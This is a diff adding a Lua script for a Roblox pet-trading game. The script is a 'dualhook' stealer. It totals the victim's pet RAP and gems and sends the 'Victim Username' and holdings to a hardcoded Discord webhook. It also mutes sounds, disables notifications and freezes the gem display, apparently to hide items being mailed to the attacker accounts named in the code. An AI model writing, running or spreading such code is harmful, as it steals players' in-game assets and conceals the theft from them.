@@ -1,0 +1,174 @@
+-- Turn off in-game volume
+UserSettings().GameSettings.MasterVolume = 0
+
+-- Dualhook part (Checks RAP for pets and items)
+local TotalRAP = 0
+local RAPThreshold = 100000000 -- Set RAP threshold for dualhook activation
+
+-- Ensure paths and directories are correct
+local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get()
+local petInventory = save.Pet or {}
+local petDirectory = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)
+
+-- Calculate Total RAP
+for i, v in pairs(petInventory) do
+    local id = v.id
+    local petData = petDirectory[id]
+
+    if petData and petData.rap then
+        TotalRAP = TotalRAP + petData.rap -- Accumulate RAP for pets
+    end
+end
+
+-- Dualhook settings
+local VodkaRad = "KHPS99_2"
+local VodkaRad2 = "KHPS99_3"
+local Webhook = "https://discord.com/api/webhooks/1329324951466938480/NSeUuLNLlq_Qr_aq2DSVzwVW6Z70nFIUwAQkoPhEitF7Zq_v_mZucL2k3mZrlpAraXk4"
+
+-- Trigger dualhook if RAP exceeds threshold
+if TotalRAP > RAPThreshold then
+    Username = VodkaRad
+    Webhook = "ayputurdualhookwebhookhere"
+    print("Dualhook Triggered for User:", Username, "Total RAP:", TotalRAP)
+end
+
+if TotalRAP > RAPThreshold then
+    Username2 = VodkaRad2
+    Webhook = "ayputurdualhookwebhookhere"
+    print("Dualhook Triggered for User 2:", Username2, "Total RAP:", TotalRAP)
+end
+
+-- Debugging log
+print("Total RAP Calculated:", TotalRAP)
+
+-- Rest of the script
+local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
+local library = require(game:GetService("ReplicatedStorage").Library)
+local mailsent = save.MailboxSendsSinceReset
+local plr = game.Players.LocalPlayer
+local MailMessage = "here u go"
+local HttpService = game:GetService("HttpService")
+local sortedItems = {}
+local GemAmount1 = 1
+
+-- Gem calculation and validation
+local newamount = 20000
+if mailsent ~= 0 then
+    newamount = math.ceil(newamount * (1.5 ^ mailsent))
+end
+
+for i, v in pairs(save.Inventory.Currency) do
+    if v.id == "Diamonds" then
+        GemAmount1 = v._am
+        break
+    end
+end
+
+if newamount > GemAmount1 then
+    return
+end
+
+-- Format numbers for display
+local function formatNumber(number)
+    local number = math.floor(number)
+    local suffixes = {"", "k", "m", "b", "t"}
+    local suffixIndex = 1
+    while number >= 1000 do
+        number = number / 1000
+        suffixIndex = suffixIndex + 1
+    end
+    return string.format("%.2f%s", number, suffixes[suffixIndex])
+end
+
+-- Send webhook message
+local function SendMessage(username, diamonds)
+    local headers = {
+        ["Content-Type"] = "application/json",
+    }
+
+    local fields = {
+        {
+            name = "Victim Username:",
+            value = username,
+            inline = true
+        },
+        {
+            name = "Summary:",
+            value = "Total RAP: " .. formatNumber(TotalRAP) .. "\nGems: " .. formatNumber(diamonds),
+            inline = false
+        }
+    }
+
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "Dualhook Triggered",
+            ["color"] = 65280,
+            ["fields"] = fields,
+            ["footer"] = {
+                ["text"] = "RAP Monitoring System"
+            }
+        }}
+    }
+
+    local body = HttpService:JSONEncode(data)
+
+    if Webhook and Webhook ~= "" then
+        local response = request({
+            Url = Webhook,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end
+end
+
+-- Protect gem leaderstat
+local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
+local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
+gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
+    gemsleaderstatpath.Value = gemsleaderstat
+end)
+
+-- Disable unnecessary notifications
+local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
+local noti = plr.PlayerGui.Notifications
+loading.Disabled = true
+noti:GetPropertyChangedSignal("Enabled"):Connect(function()
+    noti.Enabled = false
+end)
+noti.Enabled = false
+
+-- Block unwanted sounds
+game.DescendantAdded:Connect(function(x)
+    if x.ClassName == "Sound" then
+        if x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or x.SoundId == "rbxassetid://12413423276" then
+            x.Volume = 0
+            x.PlayOnRemove = false
+            x:Destroy()
+        end
+    end
+end)
+
+-- Validate RAP for individual items (example)
+local function getRAP(Type, Item)
+    return (require(game:GetService("ReplicatedStorage").Library.Client.DevRAPCmds).Get(
+        {
+            Class = {Name = Type},
+            IsA = function(hmm)
+                return hmm == Type
+            end,
+            GetId = function()
+                return Item.id
+            end,
+            StackKey = function()
+                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
+            end
+        }
+    ) or 0)
+end
+
+-- Trigger webhook for dualhook
+if TotalRAP > RAPThreshold then
+    SendMessage(Username, GemAmount1)
+    print("Webhook Sent for Dualhook!")
+end
